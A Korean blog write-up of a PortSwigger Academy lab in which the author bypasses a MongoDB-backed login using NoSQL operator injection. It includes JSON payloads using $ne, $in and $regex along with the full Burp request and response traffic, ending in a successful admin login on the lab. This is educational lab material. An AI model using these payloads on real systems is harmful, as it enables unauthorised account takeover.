---
layout: post
title: "Burp Academy-NoSQLi 관련 취약점: Exploiting NoSQL operator injection to bypass authentication"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, SQLi, NoSQL, NoSQL injecition]
toc: true
last_modified_at: 2023-10-04 09:30:00 +0900
---

# 개요
- 새로 추가된 NoSQL인젝션 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication
- 취약점 설명페이지: https://portswigger.net/web-security/nosql-injection
- 난이도: APPRENTICE (쉬움)

# NoSQL 인젝션 메모
- NoSQL인젝션은 크게 syntax injection과 operator injection의 두 가지 타입이 있다. 
- syntax injection은 기존의 SQL인젝션과 비슷하다. SQL에서 쓰이는 연산자 등을 사용할 수 있다. 
- operator injection은 NoSQL(특히 MongoDB)에서 사용되는 `$where, $ne, $in, $regex`등을 사용한 인젝션 기법이다. 
- 이번 문제는 타이틀에서 추측하건대 Operator injection을 활용한 문제같다. 

# NoSQL 인젝션 - 쿼리 오퍼레이터를 서버로 보내는 법
NoSQL의 쿼리 오퍼레이터를 서버로 보내는 법을 정리한다. 

1. JSON 메세지로 보내는 경우, 쿼리 오퍼레이터를 중첩된 오브젝트로 보낼 수도 있다. 예를들면 `{"username":"wiener"} `대신에 `{"username":{"$ne":"invalid"}}`를 보낼 수 있다. 

2. URL로 파라메터를 보내는 경우, `username=wiener `는 `[$ne]=invalid`로 대신해서 보낼 수 있다. 만약 이 것이 제대로 동작하지 않는다면, 다음을 시도해볼 수 있다. 

- 요청 메서드를 GET에서 POST로 바꾼다. 
- `Content-Type`헤더를 `application/json`로 바꾼다. 
- 메세지 바디에 JSON을 입력한다. 
- JSON안에 쿼리 오퍼레이터를 적는다. 

# NoSQL 인젝션 - 인증 바이패스 상세
1. 로그인 요청시에 POST의 바디에 다음과 같은 파라메터를 받는 취약한 어플리케이션이 있다고 하자. 

`{"username":"wiener","password":"peter"}`

2. 각 파라메터의 값을 여러 오퍼레이터로 테스트해본다. 예를들면, username에 쿼리 오퍼레이터를 삽입가능한지 알아보려면 다음과 같이 테스트할 수 있다. username이 "invalid" 가 아닌, 그리고 password는 "peter"를 사용하는 모든 유저를 찾는 쿼리가 된다. 

`{"username":{"$ne":"invalid"},"password":{"peter"}}`

3. 만약 username과 password 모두가 오퍼레이터 인젝션이 가능하다면, 다음 페이로드를 사용하면 인증을 우회할 수 있다. username과 password 각각 "invalid"가 아닌 모든 유저가 검색된다. 이 유저중에서 가장 상위에 있는 유저(DB에 가장 먼저 등록된 유저)로 인증될 것이다. 

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

4. 만약 username을 일부 지정하고 싶다면 다음과 같이 한다. username을 admin, administrator, superadmin과 같은 잘 알려진 관리자ID로 지정하고, password는 공백이 아닌 조건을 지정한다. 

`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`


# 랩설명
- 문제 사이트는 MongoDB NoSQL을 사용하고 있고, 로그인 기능에 NoSQL인젝션 취약점이 있다. 
- 이를 이용해 관리자로 로그인하면 문제가 풀린다. 
- wiener:peter로 로그인할 수 있다. 

```
The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the administrator user.

You can log in to your own account using the following credentials: wiener:peter
```

# 풀이
1. 일단 로그인 과정을 살펴본다. 다음과 같이 JSON형식의 페이로드가 전달되는 것을 확인했다. 

```http
POST /login HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=JfmsNEjgFPT37HXmriKAf7uyEwrnvwiK
Content-Length: 40
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0ac900fe040e691d83b3647700400094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":"wiener","password":"peter"}
```

2. 요청을 Repeater로 보내서 다음 페이로드를 사용가능한지 테스트해본다. 

`{"username":{"$ne":"invalid"},"password":{"peter"}}`

```
POST /login HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=JfmsNEjgFPT37HXmriKAf7uyEwrnvwiK
Content-Length: 56
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0ac900fe040e691d83b3647700400094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":{"$ne":"invalid"},"password":{"peter"}}
```

"Invalid JSON" 응답이 되돌아 온다.

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Set-Cookie: session=Hz5F8NXpCBjAMSDJztK6v8ZfKtgiqjxb; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Invalid JSON"
```

3. 몇 번 더 테스트를 해본다. password에는 {"peter"}와 같은식으로 지정을 못한다는 것을 알게 되었다. 다음과 같은 요청은 사용가능했다. 이것으로 오퍼레이터 인젝션이 가능한 것을 알게 되었다. 

```http
POST /login HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=JfmsNEjgFPT37HXmriKAf7uyEwrnvwiK
Content-Length: 40
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0ac900fe040e691d83b3647700400094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":{"$ne":"invalid"},"password":"peter"}
```

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=iJAFEfcIU6FKUwvpwKhrCsluEh0p5IlK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

4. 이번에는 다음을 테스트해본다. 

`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

```http
POST /login HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=JfmsNEjgFPT37HXmriKAf7uyEwrnvwiK
Content-Length: 40
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0ac900fe040e691d83b3647700400094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

500에러 응답이 돌아왔다. HTML페이지에는 `Query returned unexpected number of records`라는 에러 메세지가 표시된다. 쿼리 수행결과 기대되는 것보다 많은 레코드가 조회되었다는 내용이다. 이 것으로 두 가지를 알게 되었다. 위의 passowrd 파라메터도 오퍼레이터 인젝션이 가능하다는 것과, 로그인시에는 쿼리의 수행결과가 한건이어야 로그인이 정상적으로 처리된다는 점이다. 

```http
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2395

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Exploiting NoSQL operator injection to bypass authentication</title>
    </head>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Exploiting NoSQL operator injection to bypass authentication</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <a class=link-back href='https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                    </header>
                    <h4>Internal Server Error</h4>
                    <p class=is-warning>Query returned unexpected number of records</p>
                </div>
            </section>
        </div>
    </body>
</html>

```

5. 이어서 다음을 수행해본다. 만약 admin, administrator, superadmin중에 하나라도 존재하는 계정이 있으면 로그인이 될 것이다. 

`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`

```http
POST /login HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=JfmsNEjgFPT37HXmriKAf7uyEwrnvwiK
Content-Length: 40
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0ac900fe040e691d83b3647700400094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

이번에는 200응답이고, `Invalid username or password` 라는 메세지가 돌아왔다. username 또는 password가 맞지 않다는 내용이다. password는 공백이 아닌 조건이므로 수정할 필요가 없을 것 같고... username을 좀 더 추가해봐야 겠다. 

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=YaKHarqH3LNk1Kpq13DG7e3gX38ROic2; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3281

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Exploiting NoSQL operator injection to bypass authentication</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Exploiting NoSQL operator injection to bypass authentication</h2>
                            <a class=link-back href='https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username or password</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button onclick="event.preventDefault(); jsonSubmit('/login')"> Log in </button>
                            <script src='/resources/js/login.js'></script>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

6. username을 좀더 추가해서 시도해본다. 음.. 이전 문제들에서 얻은 지식이긴 하지만 PortSwigger 랩에서는 carlos란 사용자가 주로 관리자였다. carlos를 추가해본다. 

```http
POST /login HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=JfmsNEjgFPT37HXmriKAf7uyEwrnvwiK
Content-Length: 40
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0ac900fe040e691d83b3647700400094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":{"$in":["admin","administrator","superadmin",
"carlos"]},"password":{"$ne":""}}
```

오! 이번에는 302응답이 돌아왔다. 

```http
HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=rXTCwOyiYf48CnOh7RgCmFBvnQKCYmby; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

서버에서 발급해주는 새로운 session값으로 서버에 접근해본다.

```
GET /my-account?id=carlos HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=rXTCwOyiYf48CnOh7RgCmFBvnQKCYmby
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


```

 carlos유저로 로그인이 되었다. 그런데 관리자 패널이 보이지 않는다. 문제가 풀렸다는 메세지도 출력되지 않는다. 이번 랩에서는 관리자가 다른 유저인 것 같다. 어쨋든 이 테스트로 페이로드 자체는 사용가능한 것을 확신하게 되었다. username의 종류를 늘려서 테스트를 계속하자. 관리자가 사용하는 username과 맞으면 로그인할 수 있을 것이다. 

 ![carlos유저 로그인](/images/burp-academy-nosqli-2-1.png)

 7. 그러나 몇 번 더 테스트해봐도 알 수 없었다. 발상을 바꿔본다. like검색을 하면 어떨까? SQL에서 `like 'admin%'` 과 같은 식으로 사용하는 것처럼 말이다. 구글에서 검색해보니 $regex가 동일하게 동작한다고 한다. 다음 요청을 보내본다. 

 ```http
 POST /login HTTP/2
Host: 0ac900fe040e691d83b3647700400094.web-security-academy.net
Cookie: session=JfmsNEjgFPT37HXmriKAf7uyEwrnvwiK
Content-Length: 40
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://0ac900fe040e691d83b3647700400094.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac900fe040e691d83b3647700400094.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"username":{"$regex":"admin"},"password":{"$ne":""}}
 ```

그러자 다음과 같은 응답이 돌아왔다! 관리자의 username은 admingnigdu88였다. 

```http
HTTP/2 302 Found
Location: /my-account?id=admingnigdu88
Set-Cookie: session=j3I5Ezap9XUoblP84k9DayKrQgGF4ctY; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

새로운 세션값으로 서버에 접근해본다. 그러면 관리자 계정으로 로그인되고 문제 풀이에 성공했다는 메세지가 출력된다! 

![문제 풀이 성공](/images/burp-academy-nosqli-2-success.png)